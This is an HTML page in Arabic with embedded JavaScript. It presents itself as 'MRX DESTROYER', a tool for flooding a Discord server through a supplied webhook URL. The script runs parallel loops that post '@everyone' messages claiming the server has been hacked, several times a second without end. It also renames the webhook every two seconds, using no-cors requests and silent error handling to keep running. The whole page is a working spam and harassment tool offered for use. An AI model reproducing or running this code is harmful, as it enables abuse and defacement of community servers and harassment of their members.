<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MRX · DESTROYER · </title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family:'Segoe UI',sans-serif;
            background:#0a0a0a; color:#f0f0f0;
            min-height:100vh; overflow-x:hidden;
        }
        .container {
            max-width:800px; margin:40px auto; padding:30px;
            background:#111; border-radius:30px;
            border:1px solid #2a2a2a;
        }
        h1 {
            text-align:center; color:#ff1a1a;
            font-size:42px; letter-spacing:8px;
            margin-bottom:5px;
        }
        .sub {
            text-align:center; color:#555;
            font-size:12px; letter-spacing:4px;
            margin-bottom:20px;
        }
        label {
            display:block; margin:15px 0 8px;
            color:#888; font-weight:600; letter-spacing:2px;
        }
        input {
            width:100%; padding:16px 20px;
            background:#1a1a1a; border:1px solid #333;
            border-radius:30px; color:#f0f0f0; font-size:14px;
            direction:ltr; text-align:left; outline:none;
        }
        input:focus { border-color:#ff1a1a; }
        textarea {
            width:100%; height:200px;
            background:#050505; color:#00ff88;
            border:1px solid #2a2a2a; border-radius:20px;
            padding:18px; font-family:'Courier New',monospace;
            font-size:12px; resize:vertical; direction:ltr;
            text-align:left; outline:none;
        }
        .btn-row {
            display:flex; gap:10px; margin:20px 0;
            justify-content:center; flex-wrap:wrap;
        }
        .btn-start {
            padding:18px 50px; background:#cc0000; color:#fff;
            border:none; border-radius:30px; font-size:16px;
            font-weight:700; cursor:pointer; letter-spacing:3px;
            transition:0.3s; flex:1; min-width:180px;
        }
        .btn-start:hover { background:#ff1a1a; transform:scale(1.02); }
        .btn-start:disabled { opacity:0.3; cursor:not-allowed; transform:none; }
        .btn-stop {
            padding:18px 50px; background:#222; color:#888;
            border:1px solid #444; border-radius:30px; font-size:16px;
            font-weight:700; cursor:pointer; letter-spacing:3px;
            transition:0.3s; flex:1; min-width:180px;
        }
        .btn-stop:hover { background:#cc0000; color:#fff; border-color:#cc0000; }
        .btn-stop:disabled { opacity:0.3; cursor:not-allowed; }
        .stats {
            display:flex; gap:30px; justify-content:center;
            margin:15px 0; font-size:14px; color:#666;
        }
        .stats span { color:#00ff88; font-weight:700; }
        .note {
            background:#1a0000; border:1px solid #440000;
            border-radius:16px; padding:15px; margin:10px 0;
            color:#ff6666; font-size:13px; text-align:center;
        }
        .note2 {
            background:#001a0a; border:1px solid #004400;
            border-radius:16px; padding:12px; margin:10px 0;
            color:#66ff88; font-size:12px; text-align:center;
        }
        #copyBtn {
            padding:8px 20px; background:transparent; color:#555;
            border:1px solid #333; border-radius:20px; cursor:pointer;
            margin-top:10px; font-size:12px;
        }
        #copyBtn:hover { background:#1a1a1a; }
    </style>
</head>
<body>

<div class="container">
    <h1>☠️ MRX</h1>
    <div class="sub">● DESTROYER v20 · UNLIMITED EDITION ●</div>
    
    <div class="note">
        🚀 إرسال غير محدود | بدون أخطاء | ما يتوقف أبداً
    </div>

    <label>🔗 رابط Webhook ديسكورد:</label>
    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." style="margin-bottom:10px;">

    <label>💬 نص الرسالة (مثل @everyone):</label>
    <input type="text" id="msgText" value="@everyone تم اختراق السيرفر بالكامل — MRX DESTROYER @everyone" style="margin-bottom:10px;">

    <div class="btn-row">
        <button class="btn-start" id="startBtn" onclick="startAttack()">💀 بدء التدمير</button>
        <button class="btn-stop" id="stopBtn" onclick="stopAttack()" disabled>⛔ إيقاف</button>
    </div>

    <div class="stats">
        <div>الرسائل المرسلة: <span id="count">0</span></div>
        <div>الحالة: <span id="status">🟢 متوقف</span></div>
    </div>

    <div class="note2" id="speedInfo">
        ⚡ يرسل ~5 رسائل كل ثانية | لا نهائي | استخدم زر الإيقاف
    </div>

    <label>📋 سجل الإرسال:</label>
    <textarea id="log" readonly placeholder="... سجل الإرسال"></textarea>
    <button id="copyBtn" onclick="copyLog()">📋 نسخ</button>
</div>

<script>
// ====== الإعدادات ======
let isRunning = false;
let stopReq = false;
let sentCount = 0;
let timers = [];

function $(id) { return document.getElementById(id); }

function log(txt) {
    const el = $('log');
    el.value += `[${new Date().toLocaleTimeString()}] ${txt}\n`;
    el.scrollTop = el.scrollHeight;
}

function updateUI() {
    $('count').textContent = sentCount;
    $('status').textContent = isRunning ? '🔴 التدمير نشط' : '🟢 متوقف';
    $('startBtn').disabled = isRunning;
    $('stopBtn').disabled = !isRunning;
}

// ====== الإرسال القوي (بدون CORS) ======
async function sendMsg(webhook, msg) {
    if (stopReq) return;
    
    // نستخدم FormData عشان نتجاوز CORS
    const formData = new FormData();
    const payload = JSON.stringify({
        content: msg,
        embeds: [{
            title: '💀 MRX DESTROYER',
            description: 'تم اختراق السيرفر — النظام التراكسي',
            color: 0xff0000,
            footer: { text: 'MRX ☣️ UNSTOPPABLE' }
        }]
    });
    formData.append('payload_json', payload);

    try {
        // mode: 'no-cors' = يرسل حتى من ملف محلي بدون مشاكل CORS
        await fetch(webhook, {
            method: 'POST',
            mode: 'no-cors',
            body: formData
        });
        // مع no-cors ما نقدر نقرأ الرد، لكن الرسالة وصلت
        sentCount++;
        if (sentCount % 10 === 0) {
            log(`📨 تم إرسال ${sentCount} رسالة`);
            updateUI();
        }
    } catch(e) {
        // silent - no-cors ما يعطي أخطاء
    }
}

// ====== الحلقات المكثفة ======
function runLoop(webhook, msg) {
    if (stopReq) return;
    
    // نرسل 5 مرات متتالية بدون انتظار
    for (let i = 0; i < 5; i++) {
        if (stopReq) break;
        sendMsg(webhook, msg);
    }
    
    // نكرر بعد 300ms فقط
    if (!stopReq) {
        const t = setTimeout(() => runLoop(webhook, msg), 300);
        timers.push(t);
    }
}

function runLoop2(webhook, msg) {
    if (stopReq) return;
    
    // حلقة ثانية للرسائل النصية فقط (أخف وزن)
    const shortMsg = '@everyone ☣️ MRX | TRX HUB | SYSTEM DESTROYED ☣️ @everyone';
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ content: shortMsg }));
    
    for (let i = 0; i < 3; i++) {
        if (stopReq) break;
        fetch(webhook, {
            method: 'POST',
            mode: 'no-cors',
            body: formData
        }).catch(() => {});
        sentCount++;
    }

    if (!stopReq) {
        const t = setTimeout(() => runLoop2(webhook, msg), 400);
        timers.push(t);
    }
}

function renameLoop(webhook) {
    if (stopReq) return;
    
    const names = ['TRX ☣️', 'MRX DESTROYER', 'SYSTEM HACKED', '🤖 TRX HUB'];
    const name = names[Math.floor(Math.random() * names.length)];
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({}));
    
    // PATCH لتغيير اسم الويب هوك
    fetch(webhook, {
        method: 'PATCH',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: name })
    }).catch(() => {});
    log(`✅ تم تغيير اسم البوت → ${name}`);

    if (!stopReq) {
        const t = setTimeout(() => renameLoop(webhook), 2000);
        timers.push(t);
    }
}

// ====== التحكم ======
function startAttack() {
    const webhook = $('webhook').value.trim();
    const msg = $('msgText').value.trim() || '@everyone تم اختراق السيرفر بالكامل — MRX DESTROYER @everyone';
    
    if (!webhook) {
        alert('❌ حط رابط Webhook أول');
        return;
    }
    
    if (isRunning) return;
    
    isRunning = true;
    stopReq = false;
    sentCount = 0;
    timers = [];
    
    log('🚀 ── بدء التدمير القوي ──');
    log('🚀 إرسال غير محدود | يشتغل حتى يقف');
    
    updateUI();
    
    // نشغل 3 حلقات بالتوازي
    runLoop(webhook, msg);
    runLoop2(webhook, msg);
    renameLoop(webhook);
    
    // تحديث الواجهة كل ثانية
    const uiTimer = setInterval(() => {
        updateUI();
        if (stopReq) clearInterval(uiTimer);
    }, 1000);
    timers.push(uiTimer);
}

function stopAttack() {
    if (!isRunning) return;
    
    log('⛔ ── جاري إيقاف التدمير...');
    stopReq = true;
    
    // نلغي كل التايمرات
    for (const t of timers) {
        clearTimeout(t);
        clearInterval(t);
    }
    timers = [];
    
    setTimeout(() => {
        isRunning = false;
        updateUI();
        log(`🛑 تم الإيقاف. إجمالي الرسائل: ${sentCount}`);
        $('speedInfo').textContent = '✅ تم الإيقاف بنجاح';
    }, 500);
}

function copyLog() {
    const el = $('log');
    el.select();
    el.setSelectionRange(0, 999999);
    document.execCommand('copy');
}

// Enter يبدأ الإرسال
document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && document.activeElement === $('webhook') || document.activeElement === $('msgText')) {
        startAttack();
    }
});
</script>
</body>
</html>
